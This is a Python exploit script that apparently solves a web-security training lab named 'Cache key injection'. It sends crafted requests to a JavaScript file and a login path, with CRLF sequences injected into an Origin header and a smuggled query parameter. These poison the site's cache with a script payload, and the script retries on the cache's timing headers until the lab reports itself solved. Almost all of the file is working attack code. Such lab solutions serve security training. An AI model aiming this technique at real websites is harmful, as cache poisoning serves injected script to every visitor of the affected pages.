# Cache key injection

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import websocket
import ssl
import base64

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_poisoned_js(s, url):
	print('[+] Sending Localize.js poisoned requests...')
	poison_path = url + '/js/localize.js?lang=en?utm_content=z&cors=1&x=1'
	poison_headers = {"Origin": "x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$"}
	r = s.get(poison_path, headers=poison_headers, allow_redirects=False)

def send_poisoned_login(s, url):
	print('[+] Sending Login poisoned requests...')
	poison_path = url + '/login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23'
	r = s.get(poison_path, allow_redirects=False)
	return r

def send_cache_poisoning(s, url):
	solved = False
	while solved == False:
		send_poisoned_js(s, url)
		time.sleep(2)
		r = send_poisoned_login(s, url)
		if r.headers['X-Cache'] == 'miss':
			print('[+] Login path poisoned (miss)...')
		if "utm_content" in r.headers['Location']:
			print('[+] Login path poisoned (hit)...')
			time_left = 35 - int(r.headers['Age'])
			print('[+] Waiting %s seconds before retry Login...' % str(time_left))
			time.sleep(time_left)
		s.cookies.clear()
		s.headers.clear()
		r = s.get(url)
		if 'Congratulations, you solved the lab!' in r.text:
			print('\n[+] The lab is solved !')
			solved = True
			break

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Cache key injection')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()

	# s.proxies = proxies		# (BurpSuite Community Edition overrides requests in some way)

	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to send Web Cache Poisoning attack...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = s.get(url + '/login/?lang=en')
			send_cache_poisoning(s, url)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
